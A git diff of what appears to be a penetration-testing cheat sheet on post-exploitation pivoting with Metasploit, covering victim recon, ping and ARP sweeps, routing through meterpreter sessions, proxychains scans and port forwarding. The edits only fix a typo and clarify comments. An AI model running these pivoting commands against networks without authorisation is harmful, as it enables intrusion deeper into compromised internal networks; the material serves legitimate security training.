@@ -15,7 +15,7 @@ cmd> ipconfig /displaydns # view all the dns entries for domain names and subnet
 cmd> netstat ? # display help menu.
 cmd> netstat -ano # view all active TCP connections on victim.
 
-# some active techniques to discover more host.
+# some active techniques to discover more internal host.
 # 1
 msf > use post/multi/gather/ping_sweep
 msf > set SESSION 1
@@ -35,7 +35,7 @@ meterpreter > run arp_scanner -r $victim_ip_subnet # eg: 192.168.10.0/24.
 
 # ------------------------------ adding a route to the remote network.
 # 1
-msf > route add 10.10.10.0 255.255.255.0 2 # add 10.10.10.0/24 subnet through the meterpreter session 2.
+msf > route add 10.10.10.0 255.255.255.0 <SESSION_ID> # add 10.10.10.0/24 subnet through the meterpreter session 2.
 # or 
 # 2
 meterpreter > run autoroute -s 10.10.10.0/24 # adds the route via the current meterpreter session.
@@ -83,7 +83,7 @@ proxychains4 nmap -sS -Pn -n $ip --top-ports 50
 
 # when you are done, You can kill the socks4 proxy in metasploit with:
 msf > jobs -K # stops all jobs.
-msf > route flussh # clear all routes.
+msf > route flush # clear all routes.
 
 # -----------------------------2---------------------------------
 # Another way to access a remote host is using the Port Forwarding option.
@@ -91,7 +91,7 @@ meterpreter > portfwd -h # help menu.
 meterpreter > portfwd add -l 8080 -p 80 -r $remote_hostIP # this listens on our kali local port 8080 and forward all traffic received to the remote host port 80, now we should be able to access the remote host port 80 through our browser.
 
 root@kali: netstat -tulpn | grep 8080 # check if the 8080 is listening.
-127.0.0.1:8080 # enter in browser.
+127.0.0.1:8080 # enter in browser to access remote host on port 80.
 ```
 {% endcode %}
 
